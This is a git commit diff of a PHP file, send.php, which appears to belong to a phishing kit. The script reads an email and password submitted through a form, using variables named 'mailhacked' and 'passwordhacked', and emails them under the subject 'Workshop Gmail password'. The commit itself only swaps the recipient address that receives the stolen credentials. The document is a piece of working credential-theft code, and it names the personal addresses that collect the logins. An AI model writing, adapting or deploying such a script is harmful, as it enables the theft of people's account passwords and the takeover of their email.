2cca24593daec9f7069c84781feea323e5515717
SONU LODHA <57846183+sonulodha@users.noreply.github.com>
2020-06-27 16:50:19 +0530

    Update send.php

--- send.php
+++ send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "osborneandwally@gmail.com";
+         $to = "mitrasonu@outlook.com";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
